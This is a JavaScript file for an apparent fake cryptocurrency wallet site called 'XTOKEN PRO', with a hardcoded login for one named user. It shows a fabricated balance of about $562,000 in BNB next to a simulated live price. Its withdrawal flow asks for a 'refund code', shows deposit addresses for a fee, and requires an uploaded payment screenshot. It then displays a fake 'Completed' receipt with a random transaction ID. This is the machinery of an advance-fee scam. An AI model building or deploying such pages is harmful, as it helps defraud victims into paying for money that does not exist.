/**
 * XTOKEN PRO - Shared JavaScript
 * Fixed for ghosthk7XL - All amounts sync correctly
 */

// State Management
const state = {
  bnbPrice: 680.00,
  bnbBalance: 827.00000001,
  usdBalance: 562360.00,
  priceHistory: [],
  username: 'DonteG77',
  transactions: []
};

// Safe Storage wrapper
const safeStorage = {
  set: function(key, value) {
    try {
      localStorage.setItem(key, value);
      return true;
    } catch (e) {
      this.memory = this.memory || {};
      this.memory[key] = value;
      return true;
    }
  },
  get: function(key) {
    try {
      return localStorage.getItem(key);
    } catch (e) {
      this.memory = this.memory || {};
      return this.memory[key] || null;
    }
  },
  remove: function(key) {
    try {
      localStorage.removeItem(key);
    } catch (e) {
      this.memory = this.memory || {};
      delete this.memory[key];
    }
  }
};

// Initialize
document.addEventListener('DOMContentLoaded', () => {
  initParticles();
  initPriceSimulation();
  loadState();
  initRippleEffect();
  initPageSpecific();
});

// Particle Background
function initParticles() {
  const canvas = document.getElementById('particle-canvas');
  if (!canvas) return;
  
  const ctx = canvas.getContext('2d');
  let particles = [];
  const particleCount = 30;
  
  function resize() {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
  }
  resize();
  window.addEventListener('resize', resize);
  
  class Particle {
    constructor() {
      this.reset();
    }
    
    reset() {
      this.x = Math.random() * canvas.width;
      this.y = Math.random() * canvas.height;
      this.size = Math.random() * 2 + 0.5;
      this.speedX = (Math.random() - 0.5) * 0.5;
      this.speedY = (Math.random() - 0.5) * 0.5;
      this.opacity = Math.random() * 0.5 + 0.2;
    }
    
    update() {
      this.x += this.speedX;
      this.y += this.speedY;
      
      if (this.x < 0 || this.x > canvas.width || this.y < 0 || this.y > canvas.height) {
        this.reset();
      }
    }
    
    draw() {
      ctx.beginPath();
      ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
      ctx.fillStyle = `rgba(139, 92, 246, ${this.opacity})`;
      ctx.fill();
    }
  }
  
  for (let i = 0; i < particleCount; i++) {
    particles.push(new Particle());
  }
  
  function animate() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    particles.forEach(p => {
      p.update();
      p.draw();
    });
    requestAnimationFrame(animate);
  }
  animate();
}

// Price Simulation
function initPriceSimulation() {
  updatePriceDisplay();
  
  setInterval(() => {
    const changePercent = (Math.random() - 0.5) * 0.03;
    const oldPrice = state.bnbPrice;
    state.bnbPrice = Math.max(670, Math.min(685, state.bnbPrice * (1 + changePercent)));
    state.bnbPrice = parseFloat(state.bnbPrice.toFixed(2));
    state.usdBalance = state.bnbPrice * state.bnbBalance;
    saveState();
    updatePriceDisplay(oldPrice);
  }, Math.random() * 30000 + 30000);
}

function updatePriceDisplay(oldPrice = null) {
  document.querySelectorAll('[data-bnb-price]').forEach(el => {
    el.textContent = '$' + state.bnbPrice.toFixed(2);
    if (oldPrice !== null) {
      const diff = state.bnbPrice - oldPrice;
      el.classList.remove('price-up', 'price-down');
      el.classList.add(diff >= 0 ? 'price-up' : 'price-down');
      setTimeout(() => {
        el.classList.remove('price-up', 'price-down');
      }, 2000);
    }
  });
  
  document.querySelectorAll('[data-usd-balance]').forEach(el => {
    const hidden = el.classList.contains('hidden-balance');
    el.textContent = hidden ? '****' : formatCurrency(state.usdBalance);
  });
  
  document.querySelectorAll('[data-bnb-balance]').forEach(el => {
    const hidden = el.classList.contains('hidden-balance');
    el.textContent = hidden ? '****' : state.bnbBalance.toFixed(8);
  });
}

function formatCurrency(amount) {
  return new Intl.NumberFormat('en-US', {
    style: 'currency',
    currency: 'USD',
    minimumFractionDigits: 2,
    maximumFractionDigits: 2
  }).format(amount);
}

function loadState() {
  const saved = safeStorage.get('xtoken_state');
  if (saved) {
    try {
      const parsed = JSON.parse(saved);
      state.bnbPrice = parsed.bnbPrice || 680;
      state.bnbBalance = parsed.bnbBalance || 827.00000001;
      state.usdBalance = parsed.usdBalance || 562360;
    } catch(e) {
      saveState();
    }
  } else {
    saveState();
  }
}

function saveState() {
  safeStorage.set('xtoken_state', JSON.stringify({
    bnbPrice: state.bnbPrice,
    bnbBalance: state.bnbBalance,
    usdBalance: state.usdBalance,
    lastUpdate: new Date().toISOString()
  }));
}

// Ripple Effect
function initRippleEffect() {
  document.querySelectorAll('.btn, .action-btn, .asset-card, .withdraw-option').forEach(btn => {
    btn.addEventListener('click', function(e) {
      if (this.classList.contains('no-ripple')) return;
      
      const rect = this.getBoundingClientRect();
      const ripple = document.createElement('span');
      const size = Math.max(rect.width, rect.height);
      const x = e.clientX - rect.left - size / 2;
      const y = e.clientY - rect.top - size / 2;
      
      ripple.style.width = ripple.style.height = size + 'px';
      ripple.style.left = x + 'px';
      ripple.style.top = y + 'px';
      ripple.classList.add('ripple');
      
      this.appendChild(ripple);
      setTimeout(() => ripple.remove(), 600);
    });
  });
}

// Page Specific Logic
function initPageSpecific() {
  const path = window.location.pathname;
  
  if (path.includes('index') || path === '/' || path.endsWith('xtoken-wallet/') || path === '') {
    initLogin();
  } else if (path.includes('dashboard')) {
    initDashboard();
  } else if (path.includes('withdraw-form')) {
    initWithdrawForm();
  } else if (path.includes('confirm-fee')) {
    initConfirmFee();
  } else if (path.includes('success')) {
    initSuccess();
  }
}

// Login
function initLogin() {
  const form = document.getElementById('login-form');
  if (!form) return;
  
  form.addEventListener('submit', function(e) {
    e.preventDefault();
    e.stopPropagation();
    
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const errorMsg = document.getElementById('error-msg');
    
    if (username === 'DonteG77' && password === 'XTokenDG7') {
      safeStorage.set('xtoken_auth', 'true');
      window.location.href = 'dashboard.html';
      return false;
    } else {
      errorMsg.textContent = 'Invalid credentials. Please try again.';
      errorMsg.classList.remove('hidden');
      form.classList.add('shake');
      setTimeout(() => form.classList.remove('shake'), 500);
    }
  });
}

// Dashboard
function initDashboard() {
  if (!safeStorage.get('xtoken_auth')) {
    window.location.href = 'index.html';
    return;
  }
  
  const eyeToggle = document.getElementById('eye-toggle');
  if (eyeToggle) {
    eyeToggle.addEventListener('click', () => {
      document.querySelectorAll('[data-usd-balance], [data-bnb-balance]').forEach(el => {
        el.classList.toggle('hidden-balance');
      });
      eyeToggle.textContent = eyeToggle.textContent === '👁️' ? '🙈' : '👁️';
    });
  }
  
  updatePriceDisplay();
}

// Withdraw Form - FIXED with Refund Code
function initWithdrawForm() {
  const urlParams = new URLSearchParams(window.location.search);
  const type = urlParams.get('type') || 'wallet';
  
  // Show correct fields
  const typeFields = {
    'cashapp': 'cashapp-field',
    'paypal': 'paypal-field',
    'bank': 'bank-fields',
    'wallet': 'wallet-field'
  };
  
  Object.keys(typeFields).forEach(key => {
    const field = document.getElementById(typeFields[key]);
    if (field) {
      field.classList.toggle('active', key === type);
    }
  });
  
  // Amount input with conversion
  const amountInput = document.getElementById('amount');
  const conversionDisplay = document.getElementById('conversion-display');
  
  if (amountInput && conversionDisplay) {
    amountInput.addEventListener('input', (e) => {
      const usd = parseFloat(e.target.value) || 0;
      const bnb = (usd / state.bnbPrice).toFixed(8);
      conversionDisplay.innerHTML = '≈ <span class="highlight">' + bnb + ' BNB</span> at current rate';
    });
  }
  
  // Refund Code Validation
  const refundCodeInput = document.getElementById('refund-code');
  const codeStatus = document.getElementById('code-status');
  const codeError = document.getElementById('code-error');
  const continueBtn = document.getElementById('continue-btn');
  
  const VALID_CODE = '7PE9TA';
  
  if (refundCodeInput) {
    refundCodeInput.addEventListener('input', (e) => {
      const code = e.target.value.toUpperCase().trim();
      
      if (code === '') {
        codeStatus.style.display = 'none';
        codeError.style.display = 'none';
        refundCodeInput.style.borderColor = 'var(--glass-border)';
        return;
      }
      
      if (code === VALID_CODE) {
        codeStatus.style.display = 'inline';
        codeError.style.display = 'none';
        refundCodeInput.style.borderColor = 'var(--neon-green)';
        safeStorage.set('xtoken_refund_code', code);
        safeStorage.set('xtoken_has_refund', 'true');
      } else {
        codeStatus.style.display = 'none';
        codeError.style.display = 'block';
        refundCodeInput.style.borderColor = 'var(--neon-red)';
        safeStorage.remove('xtoken_refund_code');
        safeStorage.set('xtoken_has_refund', 'false');
      }
    });
  }
  
  // Form submission - SAVE ALL DATA
  const form = document.getElementById('withdraw-form');
  if (form) {
    form.addEventListener('submit', (e) => {
      e.preventDefault();
      
      const amount = document.getElementById('amount').value;
      const code = refundCodeInput ? refundCodeInput.value.toUpperCase().trim() : '';
      
      // Validate amount exists
      if (!amount || parseFloat(amount) <= 0) {
        alert('Please enter a valid amount');
        return;
      }
      
      // Validate refund code if entered
      if (code && code !== VALID_CODE) {
        alert('Invalid refund code. Please check and try again.');
        return;
      }
      
      // Save ALL transaction data to localStorage
      const formData = new FormData(form);
      const txData = {
        amount: parseFloat(amount),
        bnbAmount: (parseFloat(amount) / state.bnbPrice).toFixed(8),
        type: type,
        destination: '',
        refundCode: code === VALID_CODE ? code : '',
        hasRefund: code === VALID_CODE,
        timestamp: new Date().toISOString()
      };
      
      // Get destination based on type
      if (type === 'cashapp') {
        txData.destination = formData.get('cashapp') || '$tae81811130';
      } else if (type === 'paypal') {
        txData.destination = formData.get('paypal') || 'email@example.com';
      } else if (type === 'bank') {
        txData.destination = (formData.get('bank_name') || 'Bank') + ' - ' + (formData.get('account_number') || '****');
      } else {
        txData.destination = formData.get('wallet_address') || '0x...';
      }
      
      // Save to localStorage - CRITICAL for receipt
      safeStorage.set('xtoken_pending_tx', JSON.stringify(txData));
      
      // Build URL params for confirm page
      const params = new URLSearchParams();
      params.append('amount', amount);
      params.append('type', type);
      params.append('destination', txData.destination);
      if (code === VALID_CODE) {
        params.append('refund', '7PE9TA');
      }
      
      window.location.href = 'confirm-fee.html?' + params.toString();
    });
  }
}

// Confirm Fee Page
function initConfirmFee() {
  const urlParams = new URLSearchParams(window.location.search);
  const amount = urlParams.get('amount') || '0';
  const type = urlParams.get('type') || 'wallet';
  const destination = urlParams.get('destination') || '';
  const hasRefund = urlParams.get('refund') === '7PE9TA';
  
  // Get pending tx data
  let txData = {};
  const pending = safeStorage.get('xtoken_pending_tx');
  if (pending) {
    txData = JSON.parse(pending);
  }
  
  // Display amounts
  const usdAmount = parseFloat(amount) || txData.amount || 0;
  const bnbAmount = (usdAmount / state.bnbPrice).toFixed(8);
  
  document.querySelectorAll('[data-review-amount]').forEach(el => {
    el.textContent = formatCurrency(usdAmount);
  });
  
  document.querySelectorAll('[data-review-bnb]').forEach(el => {
    el.textContent = bnbAmount + ' BNB';
  });
  
  const typeNames = {
    'cashapp': 'Cash App',
    'paypal': 'PayPal',
    'bank': 'Bank Transfer',
    'wallet': 'External Wallet'
  };
  
  document.querySelectorAll('[data-review-type]').forEach(el => {
    el.textContent = typeNames[type] || type;
  });
  
  // Show refund code status if used
  if (hasRefund) {
    const reviewCard = document.querySelector('.review-card');
    if (reviewCard) {
      const refundRow = document.createElement('div');
      refundRow.className = 'review-row';
      refundRow.innerHTML = '<span class="review-label">Refund Code</span><span class="review-value" style="color: var(--neon-green);">7PE9TA ✓</span>';
      reviewCard.appendChild(refundRow);
    }
  }
  
  // Coin selection
  const coinSelect = document.getElementById('coin-select');
  const addressBoxes = document.querySelectorAll('.address-box');
  
  if (coinSelect) {
    coinSelect.addEventListener('change', (e) => {
      const coin = e.target.value;
      addressBoxes.forEach(box => {
        box.classList.remove('active');
        if (box.dataset.coin === coin) {
          box.classList.add('active');
        }
      });
    });
  }
  
  // Copy buttons
  document.querySelectorAll('.copy-btn').forEach(btn => {
    btn.addEventListener('click', function() {
      const text = this.dataset.copy;
      if (navigator.clipboard) {
        navigator.clipboard.writeText(text).then(() => {
          this.classList.add('copied');
          this.innerHTML = '✓ Copied';
          setTimeout(() => {
            this.classList.remove('copied');
            this.innerHTML = '📋 Copy';
          }, 2000);
        });
      }
    });
  });
  
  // File upload
  const uploadZone = document.getElementById('upload-zone');
  const fileInput = document.getElementById('proof-file');
  const proceedBtn = document.getElementById('proceed-btn');
  
  if (uploadZone && fileInput) {
    uploadZone.addEventListener('click', () => fileInput.click());
    
    uploadZone.addEventListener('dragover', (e) => {
      e.preventDefault();
      uploadZone.classList.add('dragover');
    });
    
    uploadZone.addEventListener('dragleave', () => {
      uploadZone.classList.remove('dragover');
    });
    
    uploadZone.addEventListener('drop', (e) => {
      e.preventDefault();
      uploadZone.classList.remove('dragover');
      if (e.dataTransfer.files[0]) {
        handleFile(e.dataTransfer.files[0]);
      }
    });
    
    fileInput.addEventListener('change', (e) => {
      if (e.target.files[0]) {
        handleFile(e.target.files[0]);
      }
    });
  }
  
  function handleFile(file) {
    if (!file.type.startsWith('image/')) return;
    
    const reader = new FileReader();
    reader.onload = (e) => {
      uploadZone.innerHTML = '<img src="' + e.target.result + '" class="upload-preview" alt="Preview"><p class="upload-text">✓ File uploaded</p><p class="upload-hint">' + file.name + '</p>';
      uploadZone.classList.add('has-file');
      if (proceedBtn) {
        proceedBtn.disabled = false;
        proceedBtn.classList.add('btn-glow');
      }
    };
    reader.readAsDataURL(file);
  }
  
  // Form submission - DEDUCT BALANCE & SAVE
  const form = document.getElementById('confirm-form');
  if (form) {
    form.addEventListener('submit', (e) => {
      e.preventDefault();
      
      const withdrawAmount = parseFloat(amount) || 0;
      const bnbAmount = withdrawAmount / state.bnbPrice;
      
      // DEDUCT from balance
      state.bnbBalance -= bnbAmount;
      state.usdBalance = state.bnbPrice * state.bnbBalance;
      
      // Save updated balance
      saveState();
      
      // Save completed transaction for receipt
      const completedTx = {
        amount: withdrawAmount,
        bnbAmount: bnbAmount.toFixed(8),
        type: type,
        destination: destination || txData.destination || 'Unknown',
        refundCode: hasRefund ? '7PE9TA' : '',
        date: new Date().toISOString(),
        txId: '0x' + Array(64).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join(''),
        fee: 300.00,
        status: 'Completed'
      };
      
      safeStorage.set('xtoken_last_tx', JSON.stringify(completedTx));
      safeStorage.remove('xtoken_pending_tx');
      
      window.location.href = 'success.html';
    });
  }
}

// Success Page - FIXED to show correct amounts
function initSuccess() {
  // Get transaction data
  const txData = JSON.parse(safeStorage.get('xtoken_last_tx') || '{}');
  
  // If no data, redirect to dashboard
  if (!txData.amount) {
    window.location.href = 'dashboard.html';
    return;
  }
  
  // Fill receipt with ACTUAL data
  document.querySelectorAll('[data-tx-id]').forEach(el => {
    el.textContent = (txData.txId || '0x...').substring(0, 16) + '...';
  });
  
  document.querySelectorAll('[data-tx-amount]').forEach(el => {
    el.textContent = formatCurrency(txData.amount || 0);
  });
  
  document.querySelectorAll('[data-tx-bnb]').forEach(el => {
    el.textContent = (txData.bnbAmount || '0.00000000') + ' BNB';
  });
  
  document.querySelectorAll('[data-tx-destination]').forEach(el => {
    el.textContent = txData.destination || 'Unknown';
  });
  
  document.querySelectorAll('[data-tx-date]').forEach(el => {
    el.textContent = new Date(txData.date || new Date()).toLocaleString();
  });
  
  // Show refund code if used
  if (txData.refundCode) {
    const receiptCard = document.querySelector('.receipt-card');
    if (receiptCard) {
      const refundRow = document.createElement('div');
      refundRow.className = 'receipt-row';
      refundRow.innerHTML = '<span class="receipt-label">Refund Code Applied</span><span class="receipt-value" style="color: var(--neon-green);">' + txData.refundCode + '</span>';
      receiptCard.insertBefore(refundRow, receiptCard.lastElementChild);
    }
  }
  
  // Update dashboard balance display (if on same page somehow)
  updatePriceDisplay();
  
  // Confetti
  initConfetti();
}

// Confetti Animation
function initConfetti() {
  const canvas = document.getElementById('confetti-canvas');
  if (!canvas) return;
  
  const ctx = canvas.getContext('2d');
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
  
  const colors = ['#8b5cf6', '#3b82f6', '#10b981', '#f59e0b', '#ef4444', '#06b6d4'];
  const confetti = [];
  const particleCount = 100;
  
  for (let i = 0; i < particleCount; i++) {
    confetti.push({
      x: Math.random() * canvas.width,
      y: Math.random() * canvas.height - canvas.height,
      size: Math.random() * 10 + 5,
      color: colors[Math.floor(Math.random() * colors.length)],
      speedY: Math.random() * 3 + 2,
      speedX: Math.random() * 2 - 1,
      rotation: Math.random() * 360,
      rotationSpeed: Math.random() * 10 - 5
    });
  }
  
  let frameCount = 0;
  
  function animate() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    frameCount++;
    
    confetti.forEach((p) => {
      p.y += p.speedY;
      p.x += p.speedX;
      p.rotation += p.rotationSpeed;
      
      ctx.save();
      ctx.translate(p.x, p.y);
      ctx.rotate((p.rotation * Math.PI) / 180);
      ctx.fillStyle = p.color;
      ctx.fillRect(-p.size / 2, -p.size / 2, p.size, p.size);
      ctx.restore();
      
      if (p.y > canvas.height) {
        p.y = -20;
        p.x = Math.random() * canvas.width;
      }
    });
    
    if (frameCount < 300) {
      requestAnimationFrame(animate);
    }
  }
  
  animate();
}

// Logout
function logout() {
  safeStorage.remove('xtoken_auth');
  window.location.href = 'index.html';
}

// Expose to global
window.xtoken = {
  state: state,
  formatCurrency: formatCurrency,
  logout: logout
};
